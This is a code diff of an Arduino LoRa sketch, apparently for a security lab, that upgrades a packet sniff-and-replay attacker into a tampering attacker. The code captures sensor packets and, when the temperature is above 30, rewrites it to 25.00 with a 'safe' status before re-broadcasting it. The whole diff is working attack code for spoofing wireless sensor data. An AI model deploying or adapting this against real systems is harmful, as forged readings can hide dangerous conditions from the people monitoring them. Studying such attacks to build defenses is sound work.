@@ -17,7 +17,50 @@ This code is for educational purposes only. Unauthorized use may be illegal and 
 
 String lastPacket = "";
 unsigned long lastReplay = 0;
-const unsigned long replayInterval = 5000; // 5 detik
+const unsigned long replayInterval = 10000; // 10 seconds
+
+// =====================
+// PARSE FLOAT DARI STRING
+// =====================
+float getTemp(String data) {
+  int p1 = data.indexOf(',');
+  int p2 = data.indexOf(',', p1 + 1);
+  int p3 = data.indexOf(',', p2 + 1);
+
+  if (p1 == -1 || p2 == -1 || p3 == -1) return 0;
+
+  String tempStr = data.substring(p2 + 1, p3);
+  return tempStr.toFloat();
+}
+
+// =====================
+// RULE TAMPERING
+// =====================
+String tamper(String data) {
+  int p1 = data.indexOf(',');
+  int p2 = data.indexOf(',', p1 + 1);
+
+  if (p1 == -1 || p2 == -1) return data;
+
+  String counter = data.substring(0, p1);
+  String timestamp = data.substring(p1 + 1, p2);
+
+  float temp = getTemp(data);
+
+  String fakeTemp;
+  String fakeStatus;
+
+  // ===== RULE =====
+  if (temp > 30) {
+    fakeTemp = "25.00";
+    fakeStatus = "AMAN";
+  } else {
+    fakeTemp = String(temp);
+    fakeStatus = "AMAN";
+  }
+
+  return counter + "," + timestamp + "," + fakeTemp + "," + fakeStatus;
+}
 
 void setup() {
   Serial.begin(115200);
@@ -36,13 +79,11 @@ void setup() {
 
   LoRa.receive();
 
-  Serial.println("Attacker Ready (Sniff + Replay)");
+  Serial.println("Attacker Ready (Rule-Based Tampering)");
 }
 
 void loop() {
-  // =========================
-  // 1. SNIFF
-  // =========================
+  // ===== SNIFF =====
   int packetSize = LoRa.parsePacket();
 
   if (packetSize) {
@@ -55,23 +96,22 @@ void loop() {
     Serial.print("[SNIFF] ");
     Serial.println(received);
 
-    // simpan packet terakhir
     lastPacket = received;
   }
 
-  // =========================
-  // 2. REPLAY
-  // =========================
+  // ===== TAMPER + REPLAY =====
   if (lastPacket != "" && millis() - lastReplay > replayInterval) {
     lastReplay = millis();
 
-    Serial.print("[REPLAY] ");
-    Serial.println(lastPacket);
+    String fake = tamper(lastPacket);
+
+    Serial.print("[TAMPER RULE] ");
+    Serial.println(fake);
 
     LoRa.beginPacket();
-    LoRa.print(lastPacket);
+    LoRa.print(fake);
     LoRa.endPacket();
 
-    LoRa.receive(); // balik ke mode receive
+    LoRa.receive();
   }
 }
